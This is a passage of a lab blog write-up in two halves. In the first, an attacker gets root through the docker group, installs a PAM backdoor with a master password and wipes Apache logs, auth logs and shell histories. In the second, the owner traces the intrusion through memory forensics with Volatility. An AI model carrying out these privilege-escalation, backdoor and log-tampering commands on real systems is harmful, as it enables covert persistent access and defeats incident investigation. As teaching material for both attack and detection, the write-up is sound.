Here, I executed the `id` command to make sure of my rights. I saw something really nice: the __odie__ user is in the `docker` group. Odie probably made this because he is too lazy to do `sudo` before doing some docker stuff. But because of this, I'm able to get __root__ access.

Indeed, `docker` daemon is going to access to the __root__ user, but also to all users in `docker` group. In this way, it's possible to get a __root__ shell.

```bash
odie@webserver $ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
hello-world         latest              4ab4c602aa5e        3 months ago        1.84kB

odie@webserver $ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
Unable to find image 'chrisfosterelli/rootplease:latest' locally
latest: Pulling from chrisfosterelli/rootplease
2de59b831a23: Downloading [==========================================>        ]  56.22de59b831a23: Pull complete 
354c3661655e: Pull complete 
91930878a2d7: Pull complete 
a3ed95caeb02: Pull complete 
489b110c54dc: Pull complete 
Digest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0
Status: Downloaded newer image for chrisfosterelli/rootplease:latest

You should now have a root shell on the host OS
Press Ctrl-D to exit the docker instance / shell
root@webserver # id
uid=0(root) gid=0(root) groups=0(root)
```


![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_17.gif)


## Post exploitation

During post-exploitation, it's time for backdooring the system and remove all traces left behind.

### PAM backdoor

PAM means `Pluggable Authentication Modules`, in other words, and to be brief, it's the authentication mechanism in modern Linux systems. This mechanism is requested when you're using SSH, sudo or whatever.

Now, what would happen if we added a condition to the code? Something like: "If the password is equal to PlopPlop1337, then log me regardless of the user and the real password". Many blogs got articles about this kind of backdoor, there are even some GitHub to automate the process: https://github.com/zephrax/linux-pam-backdoor

First things to do, determine the PAM version used by the target system:

```bash
root@webserver $ dpkg -l | grep pam 
[...]
ii  libpam-modules:amd64          1.1.8-3.6                      amd64        Pluggable Authentication Modules for PAM
[...]

root@webserver $ wget https://github.com/zephrax/linux-pam-backdoor/archive/master.zip

root@webserver $ unzip master.zip 

root@webserver $ ./linux-pam-backdoor-master/backdoor.sh -v 1.1.8 -p PlopPlop1337

root@webserver $ mv /lib/x86_64-linux-gnu/security/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so.bak

root@webserver $ mv pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so
```

The first `mv` is used to do a backup of the existing libary, in case of failure. It's simple, if I fail my backdoor installation, I will simply broke the authentication system.

Ok, the backdoor is installed, let's test:


![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_18.gif)


In two password prompt above, the password was: `PlopPlop1337`. The system is fully compromised, with perennial access to the system!


![](https://media.giphy.com/media/LwBqgdCi3nenTBU4wU/giphy.gif)


### Cleaning time

Ok, the backdoor is in place and well hidden. Now it's time to clean our mess. Here some elements to remove:

* Apache2 logs
* MySQL logs
* Authentication logs
* PHP arbitrary code in the WordPress
* __odie__ and __root__ history

I probably forget things to remove. Some are well known, but others not at all. I must have really forgot things :')

#### Apache logs

The `access.log` file contains Apache2 server logs, each page requested, http method and so on are stored in this file.

I just have to find when I started to play with my arbitrary code in the WordPress theme:

```bash
backdoor $ cat access.log | less -N 
[Research on "x="]
    666 zer.php&theme=rock-band" "Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0"
    667 192.168.122.1 - - [27/Dec/2018:00:35:10 +0100] "GET /wp-content/themes/rock-band/inc/customizer.php HTTP/1.1" 500 185 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:64.0) 
    667 Gecko/20100101 Firefox/64.0"
    668 192.168.122.1 - - [27/Dec/2018:00:35:15 +0100] "GET /wp-content/themes/rock-band/inc/customizer.php?x=ls HTTP/1.1" 500 185 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:6    668 4.0) Gecko/20100101 Firefox/64.0"
    669 192.168.122.147 - - [27/Dec/2018:00:35:21 +0100] "GET /wp-admin/theme-editor.php?theme=rock-band&file=inc%2Fcustomizer.php&wp_scrape_key=370c7cd663254ecfd57bd42d35e    669 318a7&wp_scrape_nonce=1674105339 HTTP/1.1" 200 12023 "-" "WordPress/5.0.2; http://192.168.122.147"

backdoor $ cat access.log | head -n 666 > access.log.bak 
backdoor $ mv access.log.bak access.log 
```

Moreover, we're speaking about Iron Maiden since the beginning, 666 is a good number!

#### MySQL logs

In `/var/log/mysql/` folder there is only one file: `error.log`. It does not contains that much relevant for a forensic analyst. However, there are `.mysql_history` file in each users folders: `/root` and `/home/odie`.

```bash
backdoor # cat /home/odie/.mysql_history
[legit data]

backdoor # cat /root/.mysql_history
[legit data]
```

It's better not to remove everything. Even if Odie is not looking at his logs, let's try to delete only necessary stuff.

#### Authentication logs

The `/var/log/auth.log` file contains authentication logs, we talked about PAM mechanism earlier. I will take a look inside to know when __www-data__ started to execute Linux commands:

```bash
$ cat /var/log/auth.log | less -N
[Looking for "www-data"]
     88 Dec 26 20:39:01 webserver CRON[12209]: pam_unix(cron:session): session closed for user root
     89 Dec 26 20:41:26 webserver sudo:     odie : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/chown -R www-data:www-data /var/www/html
     90 Dec 26 20:41:26 webserver sudo: pam_unix(sudo:session): session opened for user root by odie(uid=0)

$ cat /var/log/auth.log | head -n 88 > /var/log/auth.log.bak 
$ mv /var/log/auth.log.bak /var/log/auth.log
```

#### PHP backdoor

Remember the cute little line in the WordPress theme? Well, it's time to take it off. However, to avoid generating other apache logs, we will not go through the web interface, but through our favorite command line text editor.

```bash
backdoor # vim /var/www/html/wp-content/themes/rock-band/inc/customizer.php
[Backdoor removing]
```

#### Users history

I logged in with a lot of users during this operation:

* www-data
* odie
* root

`.bash_history` files got polluted. Let's start with __odie__:

```bash
backdoor # cat /home/odie/.bash_history | less -N
[...]
 	156 cd /var/www/html
    157 sudo mysqldump wp_db > database_name.sql
    158 sudo su
    159 docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
[...]

backdoor # cat /home/odie/.bash_history | head -n 158 > /home/odie/.bash_history.bak
backdoor # mv /home/odie/.bash_history.bak /home/odie/.bash_history
```

Same operation with __root__ user:

```bash
backdoor # cat /root/.bash_history | less -N     
	23 mysqldump wp_db > database_name.sql
    24 md5sum database_name.sql 
    25 exit
    26 exit
    27 dpkg -l | grep pam 

backdoor # cat /root/.bash_history | head -n 26 > /root/.bash_history.bak 
backdoor # mv /root/.bash_history.bak /root/.bash_history
```

Like KFC, it's all good. Traces are erased and we kept our backdoor in place.


![](https://media.giphy.com/media/8fen5LSZcHQ5O/giphy.gif)


# Blue team time

Odie, taken in his studies, didn't notice anything on his fanboy site. Several days goes, and the hacker connects to the VPS sometimes. To steal all ENSIBS courses.

One day, this silly hacker did a mistake: he forgot to log off. By chance, Odie did a `ss` and sees an unusual connection:

```bash
real_odie $ ss | grep tcp
tcp   ESTAB      0      0      192.168.122.216:ssh                  192.168.122.158:36736                
tcp   ESTAB      0      0      192.168.122.216:ssh                  192.168.122.1:39178
```


![](/lib/images/articles/realgsmoveinsilencelikelasagna/blue_1.gif)


Panicked by what he sees, he decides to make a memory dump of his VPS and put on his cyber digital firefighter cap 2.0.

## Forensic environment

In order to analyze this case in the best possible conditions, it's necessary to extract the memory from the server and creating the appropriate volatility profile.

### Disk extraction

To avoid further corrupting this infected disk, I will make a bit-by-bit copy of it with `dd` to be able to analyze it safely. For space and portability reasons, I will compress it on the fly:

```bash
real_odie $ lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sr0     11:0    1 1024M  0 rom  
vda    254:0    0   12G  0 disk 
├─vda1 254:1    0   10G  0 part /
├─vda2 254:2    0    1K  0 part 
└─vda5 254:5    0    2G  0 part [SWAP]

real_odie $ sudo bash -c "dd if=/dev/vda1 bs=4M status=progress | gzip > /mnt/vda1_dmp_2019_01.gz"
10607394816 bytes (11 GB, 9,9 GiB) copied, 167,002 s, 63,5 MB/s 
2560+0 enregistrements lus
2560+0 enregistrements écrits
10737418240 bytes (11 GB, 10 GiB) copied, 167,876 s, 64,0 MB/s

real_odie $ md5sum vda1_dmp_2019_01.gz       
43b967640cc102f05fb2b371516468fa  vda1_dmp_2019_01.gz
```

You can download the dump here: https://mega.nz/#!7OgBSCxQ!LVvuyZBfl4aFXAk5VsKs_y-RwmhM8KZeqNhOfBEuu6g

| Fichier | MD5 | Lien |
|---------|-----|------|
|vda1_dmp_2019_01.gz|43b967640cc102f05fb2b371516468fa|https://mega.nz/#!7OgBSCxQ!LVvuyZBfl4aFXAk5VsKs_y-RwmhM8KZeqNhOfBEuu6g|

### Timeline

### Memory extraction

To extract the memory from the server, I will use LiME: Linux Memory Extractor.

```bash
real_odie $ git clone https://github.com/504ensicsLabs/LiME
real_odie $ cd LiME/src 
real_odie $ make
real_odie $ sudo insmod lime-4.9.0-8-amd64.ko "path=/home/odie/memory.dmp format=lime timeout=0"
real_odie $ strings memory.dmp | grep "Linux version"
[...]
Linux version 4.9.0-8-amd64 (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18+deb9u1) ) #1 SMP Debian 4.9.130-2 (2018-10-27)
[...]
```

### Volatility profile

I already presented a way to create a volatility profile in `Santhacklaus` CTF writeups: https://maki.bzh/courses/blog/writeups/santhacklaus2018/#profile-generation

Here, Odie will be doing the same thing:

```bash
real_odie $ sudo apt install volatility-tools dwarfdump zip
real_odie $ cd /usr/src/volatility-tools/linux/
real_odie $ su root 
real_odie # make
real_odie # uname -a
Linux webserver 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux
real_odie # zip Odie_profile.zip /usr/src/volatility-tools/linux/module.dwarf /boot/System.map-4.9.0-8-amd64
  adding: usr/src/volatility-tools/linux/module.dwarf (deflated 91%)
  adding: boot/System.map-4.9.0-8-amd64 (deflated 79%)
```

All we have to do now is import the new profile wherever we want. In order to use it with Volatility. Personally I made a little docker for volatility: https://gitlab.com/Maki_chaz/infosec-docker/tree/master/forensic/volatility

```bash
$ sudo docker run --rm --name volatility -v /home/maki/Tools/plugin_vol:/opt/plug_vol -v ${PWD}:/opt/usr_land -ti volatility
$ vol.py --plugins=plug_vol/ --info | grep Odie
Volatility Foundation Volatility Framework 2.6.1
LinuxOdie_profilex64            - A Profile for Linux Odie_profile x64
$ vol.py --plugins=plug_vol/ --profile=LinuxOdie_profilex64 -f usr_land/memory.dmp linux_banner
Volatility Foundation Volatility Framework 2.6.1
Linux version 4.9.0-8-amd64 (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18+deb9u1) ) #1 SMP Debian 4.9.130-2 (2018-10-27)
```

Everything is finally ready for the analysis! You can download archives below:

| Fichier | MD5 | Lien |
|---------|-----|------|
|memory.tar.gz|ff2d570749e019e00448fc83412ceeb1|https://mega.nz/#!3LA3nQQQ!-2JIOVfsajxS-OPjERK4SEyWetSjyOiyWuPYkiXkqWU|
|Odie_profile.zip|61ab07058a0a66046ad085f0973b1543|https://mega.nz/#!iXgTFazJ!x8w6eZaUcju1Le89nkUMLkSegQe3CD5sJeX8okuoBt8|

## DFIR time

Finally, the expect moment: the treasure hunt! Odie intends to investigate this mysterious connection. Fortunately, he has been cyberdefense courses at ENSIBS to help him in this task.

### Malicious connection

So, obviously a suspicious IP is connected:

> 192.168.122.158

```bash
$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_netstat > pnetstat
$ cat pnetstat | grep '192.168.122.158'
TCP      192.168.122.216 :   22 192.168.122.158 :36736 ESTABLISHED                  sshd/22335
TCP      192.168.122.216 :   22 192.168.122.158 :36736 ESTABLISHED                  sshd/22341
```

These connections come from SSH. Let's see how processes are arranged:

```bash
$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_pstree > ppstree
$ cat ppstree
Name                 Pid             Uid            
systemd              1                              
.systemd-journal     193                            
.systemd-udevd       216                            
.systemd-timesyn     289             100            
.rsyslogd            324                            
.dbus-daemon         326             105            
.cron                343                            
.systemd-logind      344                            
.agetty              371                            
.sshd                374                            
..sshd               409                            
...sshd              418             1000           
....bash             419             1000           
.....sudo            22887                          
......insmod         22888                          
..sshd               22335                          
...sshd              22341           1000           
....bash             22342           1000           
.....sudo            22347                          
......su             22348                          
.......bash          22349                          
.dhclient            393                            
.systemd             411             1000           
..(sd-pam)           412             1000           
.packagekitd         14659                          
.polkitd             14670                          
.containerd          16169                          
.dockerd             16290                          
.apache2             21462                          
..apache2            21463           33             
..apache2            21464           33             
..apache2            21466           33             
..apache2            21467           33             
..apache2            21589           33             
..apache2            21731           33             
..apache2            21732           33             
..apache2            21733           33             
..apache2            21734           33             
..apache2            21735           33             
.mysqld              21557           107            
[...]
```

Processes `22341` and `22335` are executes by the IUD 1000, in other words, the user __odie__. It's quite surprising.

The attacker has been logged in legitimately. If the hacker would abuse a binary, the parent would be this binary and not a legit service (like ssh). In our case, it's considered as a legit connection for the system, there are two possibilities:

* The attacker found the __odie__'s password ;
* The attacker implemented a backdoor.

Odie knows his session password, it's easy to search it in memory using `yarascan` plugin from Volatility:

```bash
$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_yarascan -Y "1r0nm41d3n!"
[...]
Task: sshd pid 418 rule r1 addr 0x55f43e6dd646
0x55f43e6dd646  31 72 30 6e 6d 34 31 64 33 6e 21 0d 6c 73 20 2d   1r0nm41d3n!.ls.-
0x55f43e6dd656  6c 61 0d 73 75 64 6f 20 73 75 0d 1b 5b 41 1b 5b   la.sudo.su..[A.[
0x55f43e6dd666  41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41   A.[A.[A.[A.[A.[A
0x55f43e6dd676  1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b   .[A.[A.[A.[A.[A.
0x55f43e6dd686  5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b   [A.[A.[A.[A.[A.[
0x55f43e6dd696  41 1b 5b 41 1b 5b 41 1b 5b 42 1b 5b 42 1b 5b 41   A.[A.[A.[B.[B.[A
0x55f43e6dd6a6  0d 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41   ..[A.[A.[A.[A.[A
0x55f43e6dd6b6  1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b   .[A.[A.[A.[A.[A.
0x55f43e6dd6c6  5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b   [A.[A.[A.[A.[A.[
0x55f43e6dd6d6  41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 42   A.[A.[A.[A.[A.[B
0x55f43e6dd6e6  0d 73 79 73 74 65 6d 63 74 20 7f 6c 20 72 65 73   .systemct..l.res
0x55f43e6dd6f6  74 61 72 74 20 61 70 7f 61 7f 70 61 63 65 68 32   tart.ap.a.paceh2
0x55f43e6dd706  7f 7f 7f 68 65 32 0d 1b 5b 41 1b 7f 6d 61 72 69   ...he2..[A..mari
0x55f43e6dd716  61 64 62 0d 65 78 69 74 0d 70 69 6e 67 20 67 6f   adb.exit.ping.go
0x55f43e6dd726  6f 67 6c 65 2e 66 72 0d 03 6c 73 20 2d 6c 61 20   ogle.fr..ls.-la.
0x55f43e6dd736  2f 75 73 09 6c 6f 09 62 69 09 09 0d 73 73 68 2d   /us.lo.bi...ssh-
``` 

Interesting, this string appears many times in memory. In `sshd` process. Let's locate exactly where:

```bash
$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_proc_maps -p 418
Volatility Foundation Volatility Framework 2.6.1
Offset             Pid      Name                 Start              End                Flags               Pgoff Major  Minor  Inode      File Path
------------------ -------- -------------------- ------------------ ------------------ ------ ------------------ ------ ------ ---------- ---------
0xffff9796b895e040      418 sshd                 0x000055f43d7d3000 0x000055f43d890000 r-x                   0x0    254      1     143894 /usr/sbin/sshd
0xffff9796b895e040      418 sshd                 0x000055f43da90000 0x000055f43da93000 r--               0xbd000    254      1     143894 /usr/sbin/sshd
0xffff9796b895e040      418 sshd                 0x000055f43da93000 0x000055f43da94000 rw-               0xc0000    254      1     143894 /usr/sbin/sshd
0xffff9796b895e040      418 sshd                 0x000055f43da94000 0x000055f43da9d000 rw-                   0x0      0      0          0 
0xffff9796b895e040      418 sshd                 0x000055f43e6b6000 0x000055f43e6fb000 rw-                   0x0      0      0          0 [heap]
[...]
```

The password has been found at the address `0x55f43e6dd646`. The sshd heap owns this address (`0x000055f43e6b6000` - `0x000055f43e6fb000`). Let's extract the heap:

```bash
$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_dump_map -s 0x000055f43e6b6000 -p 418 -D .
Volatility Foundation Volatility Framework 2.6.1
Task       VM Start           VM End                         Length Path
---------- ------------------ ------------------ ------------------ ----
       418 0x000055f43e6b6000 0x000055f43e6fb000            0x45000 ./task.418.0x55f43e6b6000.vma

$ strings task.418.0x55f43e6b6000.vma | less 
[lot of useful data]

$ strings task.418.0x55f43e6b6000.vma | grep -C 3 "sudo" 
0Em>
sb_release -cs) \
   stable"
sudo apt-get update && sudo apt-get install docker-ce
sudo usermod -aG docker odie
i pa
ip a
apt install python
--
[2;2R
]11;rgb:0000/0000/2c2c
[>65;5403;1ciT
sudo apt install mariadb-client mariadb-server
1r0nm41d3n!
sud su
o su

```

I realize that there are many interesting things stored in the heap:

* Environment variables
* Clear session password and hash
* Executed commands

Really instructive, let's do the same operation on the suspicious `sshd` process, the PID `22341`. 

```bash
$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_proc_maps -p 22341 | grep heap
Volatility Foundation Volatility Framework 2.6.1
0xffff9796bab09040    22341 sshd                 0x0000556477825000 0x0000556477862000 rw-                   0x0      0      0          0 [heap]

$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_dump_map -s 0x0000556477825000 -p 22341 -D .
Volatility Foundation Volatility Framework 2.6.1
Task       VM Start           VM End                         Length Path
---------- ------------------ ------------------ ------------------ ----
     22341 0x0000556477825000 0x0000556477862000            0x3d000 ./task.22341.0x556477825000.vma
```

When the sshd heap is successfully extracted, I'm looking for this string: `sudo`. Each time sudo is called, it asks for your password:

```bash
$ strings task.22341.0x556477825000.vma | grep -C 3 "sudo"
odie
(	To+
sshd
sudo su
PlopPlop1337
odie
zV%0
[...]
```

What a surprise, the string `PlopPlop1337` is really strange. This string does not appear in the heap of the legit sshd process. The backdoor hypothesis becomes a reality.

We have barely made this discovery that Odie wants to try to log on with these credentials: 

> Odie : PlopPlop1337

He realizes with amazement that it works! It seems that a backdoor has been installed! Questions are: where it is and how did it come here?


![](/lib/images/articles/realgsmoveinsilencelikelasagna/blue_2.gif)


After a few research on the internet, I fell on PAM mechanism and a great GitHub for backdoor creation: https://github.com/zephrax/linux-pam-backdoor

If we follow the GitHub carefully, the file containing the backdoor should be the `pam_unix.so` library.

```bash
$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_find_file -L > pfile_list
$ cat pfile_list| grep 'pam_unix.so'
          406506 0xffff97969858f128 /bin/bin/lib/x86_64-linux-gnu/security/pam_unix.so
          393641 0xffff97967660c228 /bin/bin/lib/x86_64-linux-gnu/security/pam_unix.so.bak
```

Well, well, well. Fortunately, our friend the hacker is a nice man, he has created a backup for us :D
Let's extract these files the _bak_  should be the real library and the other the backdoor.

```bash
$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_find_file -i 0xffff97969858f128 -O pam_unix.so
$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_find_file -i 0xffff97967660c228 -O pam_unix.so.swp
$ md5sum pam_unix.so*
bdeb3146f66059b44c03522414497e2a  pam_unix.so
3f6a3cec7fc05d66d269d10614e4c20b  pam_unix.so.swp
```

It's true, doing md5 comparaison between two files extracted from memory is not really relevent. Who knows, it could have been useful.
After a brief analysis of their strings, `PlopPlop1337` is found in `pam_unix.so` library. It is true, we have located the backdoor! Champagne!

Another string caught my attention:

```bash
$ strings pam_unix.so | less
[...]
libc.so.6
pam_unix.so
/home/monique/T
chargements/ironmaiden/linux-pam-backdoor-master/Linux-PAM-1.1.8/libpam/.libs:/lib64
GLIBC_2.2.5
LIBPAM_EXTENSION_1.0
[...]
```

Obviously, the bad hacker is called `Monique`! This string is here because the bad girl compiled the PAM backdoor on her machine and not on Odie's web server.

There are several things to consider:

* If there is a PAM backdoor, then Monique got __root__ rights ;
* On a web server, the entrypoint must be the website ;
* Even if the web site got pwned, Monique did one or more privilege escalation.

### Entrypoint

Ok, me and Odie found the backdoor. But if we remove it without finding the entry point, then Monique will be able to install her backdoor again and again, without any problems.

Let's focus on the web server. First of all, finding Apache2 logs:

```bash
$ cat pfile_list| grep '/var/log/apache2'
          529847 0xffff9796ba37d228 /bin/bin/var/log/apache2
          530134 0xffff9796b95a23e8 /bin/bin/var/log/apache2/access.log.swp
          530135 0xffff9796b954b698 /bin/bin/var/log/apache2/other_vhosts_access.log
          530133 0xffff9796b95a2c48 /bin/bin/var/log/apache2/error.log
```

Monique must be a really nice girl. She did backups before removing something. Or she is just a bit stupid and don't know how to really clean her traces :D


![](https://media.giphy.com/media/33iqmp5ATXT5m/giphy.gif)


```bash
$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_find_file -i 0xffff9796b95a23e8 -O access.log.swp
$ cat access.log.swp | grep 158 | ccze -A | less -I
```

Pro tip: when you have to read large Apache2 logs, and you don't have super cyber SIEM 4.0, you got `ccze`. It will colorize the output and will gives this result:

 
![](/lib/images/articles/realgsmoveinsilencelikelasagna/blue_3.png)


Odie sees a beautiful little _User-Agent_: `DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)`

`DirBuster` is a Java tool provided by OWASP, it allows a pentester to bruteforce filenames and directories of a web server according to preset wordlist.

Monique IP address tried to find filenames and directories with this tool. Let's count together most visited web pages:

```bash
$ cat access.log.swp | awk '{print $7}' | sort | uniq -c | grep -v ' 1 '
    11 /
      5 /favicon.ico
      2 /icons/
      4 /index.php
      2 /index.php/2018/12/27/eddie-the-head/
      6 /test.php
     23 /wp-admin/admin-ajax.php
      2 /wp-admin/js/media-upload.min.js?ver=5.0.2
      3 /wp-admin/themes.php
      2 /wp-content/
     12 /wp-content/themes/my-music-band/assets/css/font-awesome/css/blocks.css?ver=1.0
      2 /wp-content/themes/my-music-band/assets/css/font-awesome/css/font-awesome.css
     10 /wp-content/themes/my-music-band/assets/css/font-awesome/css/font-awesome.css?ver=4.7.0
      6 /wp-content/themes/my-music-band/assets/css/font-awesome/fonts/fontawesome-webfont.woff2?v=4.7.0
      2 /wp-content/themes/my-music-band/assets/js/customize-preview.min.js?ver=20180103
     10 /wp-content/themes/my-music-band/assets/js/fitvids.min.js?ver=1.1
     10 /wp-content/themes/my-music-band/assets/js/functions.min.js?ver=201800703
     10 /wp-content/themes/my-music-band/assets/js/skip-link-focus-fix.min.js?ver=201800703
      2 /wp-content/themes/my-music-band/inc/metabox/metabox.js?ver=20180103
      2 /wp-content/themes/my-music-band/screenshot.png
     10 /wp-content/themes/my-music-band/style.css?ver=5.0.2
      2 /wp-content/themes/rock-band/assets/images/header-image.jpg
      2 /wp-content/themes/rock-band/screenshot.png
     10 /wp-content/themes/rock-band/style.css?ver=5.0.2
     10 /wp-content/uploads/2018/12/ironmaiden_band.jpg
      5 /wp-content/uploads/2018/12/ironmaiden_eddie.jpg
      3 /wp-includes/css/dist/block-library/style.min.css?ver=5.0.2
      3 /wp-includes/css/dist/block-library/theme.min.css?ver=5.0.2
      2 /wp-includes/fonts/dashicons.eot
      2 /wp-includes/js/customize-base.min.js?ver=5.0.2
      3 /wp-includes/js/jquery/jquery.js?ver=1.12.4
      3 /wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1
      2 /wp-includes/js/tinymce/plugins/compat3x/plugin.min.js?ver=4800-20180716
      2 /wp-includes/js/tinymce/tinymce.min.js?ver=4800-20180716
      2 /wp-includes/js/underscore.min.js?ver=1.8.3
      3 /wp-includes/js/wp-a11y.min.js?ver=5.0.2
      3 /wp-includes/js/wp-embed.min.js?ver=5.0.2
      3 /wp-includes/js/wp-emoji-release.min.js?ver=5.0.2
      4 /wp-login.php
```

Now, let's exclude WordPress files, they really seem to be legit and up to date (for the moment). And let me add some displayed data:

```bash
$ cat access.log.swp | awk '{print $1 $6 $7}' | sort | uniq -c | grep -v 'wp' | grep -v ' 1 '   
      2 127.0.0.1"GET/test.php
      3 192.168.122.158"GET/
      2 192.168.122.158"GET/favicon.ico
      3 192.168.122.158"HEAD/
      5 192.168.122.1"GET/
      3 192.168.122.1"GET/favicon.ico
      2 192.168.122.1"GET/index.php/2018/12/27/eddie-the-head/
      3 192.168.122.1"POST/test.php
```

The IPs for `test.php` do not seem to come from Monique. However, the apache log file seems to be truncated:

```bash
$ cat access.log.swp| tail -n 4                            
192.168.122.158 - - [27/Dec/2018:19:50:32 +0100] "HEAD /traffic.php HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.122.158 - - [27/Dec/2018:19:50:32 +0100] "HEAD /thumbs.php HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.122.158 - - [27/Dec/2018:19:50:32 +0100] "HEAD /65.php HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.122.158 - - [27/Dec/2018:19:50:32 +0100] "HEAD /topic/ HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://%
```

Unfortunately, there is no `.bash_history` for the user __www-data__. We have to find another way to find out what Monique did with this site. 

After searching for several hours, Odie reminds me that he still has access to his VPS, let's see what we can get from it. If there is any additional information in the VPS log files:

```bash
webserver $ cat ../auth.log | grep 158
Dec 27 19:58:33 webserver sshd[21592]: Did not receive identification string from 192.168.122.158 port 35782
Dec 27 21:17:03 webserver sshd[21871]: Connection closed by 192.168.122.158 port 36434 [preauth]
[...]
Dec 27 21:49:51 webserver sshd[22149]: Disconnected from 192.168.122.158 port 36538
Dec 27 22:23:44 webserver sshd[22335]: Accepted password for odie from 192.168.122.158 port 36736 ssh2
Dec 28 00:52:47 webserver sshd[24179]: Accepted password for odie from 192.168.122.158 port 37392 ssh2

```

The first connection seems to have been established the `27/12 at 19:58:33` and the last the `28/12 at 00:52:47`. The last connection is the one that appears during Odie's `ss`.

If I apply a filter on the first schedule in Apache2 logs, `access.log`, we can get interesting things:

```bash
webserver $ cat access.log | grep "19:58"
192.168.122.158 - - [27/Dec/2018:19:58:39 +0100] "GET / HTTP/1.0" 200 17847 "-" "-"
192.168.122.158 - - [27/Dec/2018:19:58:40 +0100] "POST /sdk HTTP/1.1" 404 462 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.122.158 - - [27/Dec/2018:19:58:40 +0100] "GET /nmaplowercheck1545937121 HTTP/1.1" 404 483 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.122.158 - - [27/Dec/2018:19:58:40 +0100] "GET /evox/about HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.122.158 - - [27/Dec/2018:19:58:40 +0100] "GET /HNAP1 HTTP/1.1" 404 464 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.122.158 - - [27/Dec/2018:19:58:40 +0100] "GET / HTTP/1.0" 200 17847 "-" "-"
192.168.122.158 - - [27/Dec/2018:19:58:40 +0100] "GET / HTTP/1.1" 200 17095 "-" "-"
192.168.122.158 - - [27/Dec/2018:19:58:58 +0100] "POST /test.php HTTP/1.1" 200 927 "http://192.168.122.216/test.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:19:58:58 +0100] "GET /favicon.ico HTTP/1.1" 404 506 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"

webserver $ cat access.log | grep "19:58" | grep -v 'Nmap'
192.168.122.158 - - [27/Dec/2018:19:58:39 +0100] "GET / HTTP/1.0" 200 17847 "-" "-"
192.168.122.158 - - [27/Dec/2018:19:58:40 +0100] "GET / HTTP/1.0" 200 17847 "-" "-"
192.168.122.158 - - [27/Dec/2018:19:58:40 +0100] "GET / HTTP/1.1" 200 17095 "-" "-"
192.168.122.158 - - [27/Dec/2018:19:58:58 +0100] "POST /test.php HTTP/1.1" 200 927 "http://192.168.122.216/test.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
192.168.122.158 - - [27/Dec/2018:19:58:58 +0100] "GET /favicon.ico HTTP/1.1" 404 506 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0"
```

As we can see, `test.php` file was called in the same minute, but it's a POST request, with a standard User-Agent. The attacker probably wanted to test something. 

In filtering on "158" (Monique IP address suffix), "test.php" and removing all garbage request due to Nmap and DirBuster, we can find this:

```bash
webserver $ cat access.log | grep 158 | grep -A 4 test.php | grep -v -E "DirBuster|Nmap"
